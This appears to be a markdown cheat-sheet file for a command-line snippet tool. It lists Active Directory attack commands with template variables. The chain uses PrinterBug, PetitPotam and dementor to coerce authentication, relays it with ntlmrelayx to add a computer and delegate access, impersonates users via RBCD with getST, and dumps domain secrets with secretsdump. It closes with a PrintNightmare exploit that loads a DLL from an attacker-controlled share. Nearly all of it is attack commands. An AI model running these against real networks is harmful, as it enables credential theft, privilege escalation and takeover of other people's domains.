# Coerce + Relay

Coerce machine accounts (PrinterBug, PetitPotam, DFSCoerce, WebClient) into NTLM-authenticating to a controlled listener, then relay or harvest. Pair with `coercer.md`, `responder.md`, and `ntlmrelayx.md`.

### Find spooler (authenticated)

Trigger find spooler (authenticated) with Coerce + Relay.

```sh title:"Coerce + Relay Trigger Find Spooler (authenticated)"
rpcdump.py $domain/$user:$pass@$rhost_ip | grep MS-RPRN
```
<!-- cheat
import domain_ip
import users
var pass
-->

### Find spooler (anonymous)

Trigger find spooler (anonymous) with Coerce + Relay.

```sh title:"Coerce + Relay Trigger Find Spooler (anonymous)"
rpcdump.py $rhost_ip | grep -A 6 MS-RPRN
```
<!-- cheat
import domain_ip
-->

### Find WebDAV clients

Trigger find WebDAV clients with Coerce + Relay.

```sh title:"Coerce + Relay Trigger Find WebDAV Clients"
webclientservicescanner $domain/$user:$pass@$cidr
```
<!-- cheat
import domain_ip
import users
var pass
var cidr
-->

### PrinterBug (printerbug.py)

Trigger PrinterBug (printerbug.py) with Coerce + Relay.

```sh title:"Coerce + Relay Trigger PrinterBug (printerbug.py)"
printerbug.py $domain/$user:$pass@$rhost_ip $lhost
```
<!-- cheat
import tun_ip
import domain_ip
import users
var pass
-->

### PetitPotam

Trigger PetitPotam with Coerce + Relay.

```sh title:"Coerce + Relay Trigger PetitPotam"
PetitPotam.py -u $user -p $pass -d $domain $lhost $rhost_ip
```
<!-- cheat
import tun_ip
import domain_ip
import users
var pass
-->

### Dementor

Trigger dementor with Coerce + Relay.

```sh title:"Coerce + Relay Trigger Dementor"
dementor.py -d $domain -u $user -p $pass $lhost $rhost_ip
```
<!-- cheat
import tun_ip
import domain_ip
import users
var pass
-->

### ntlmrelayx add computer + delegate

Trigger ntlmrelayx add computer + delegate with Coerce + Relay.

```sh title:"Coerce + Relay Trigger Ntlmrelayx Add Computer + Delegate"
ntlmrelayx.py -t ldaps://$rhost_ip -smb2support --remove-mic --add-computer $rhost_name $target_pass --delegate-access
```
<!-- cheat
import domain_ip
var rhost_name
var target_pass
-->

### getST impersonate via RBCD

Trigger getST impersonate via RBCD with Coerce + Relay.

```sh title:"Coerce + Relay Trigger GetST Impersonate Via RBCD"
getST.py -spn host/$rhost_name -impersonate $target_user -dc-ip $rhost_ip $domain/$rhost_name\$:$target_pass
```
<!-- cheat
import domain_ip
var rhost_name
var target_user
var target_pass
-->

### secretsdump with ccache

Trigger secretsdump with ccache with Coerce + Relay.

```sh title:"Coerce + Relay Trigger Secretsdump with Ccache"
KRB5CCNAME=$ccache_file secretsdump.py -k -no-pass $rhost_ip
```
<!-- cheat
import domain_ip
var ccache_file
-->

### PrintNightmare CVE-2021-1675

Trigger PrintNightmare CVE 2021 1675 with Coerce + Relay.

```sh title:"Coerce + Relay Trigger PrintNightmare CVE 2021 1675"
CVE-2021-1675.py $domain/$user:$pass@$rhost_ip '\\$lhost\$share\$dll_name'
```
<!-- cheat
import tun_ip
import domain_ip
import users
var pass
var share
var dll_name
-->
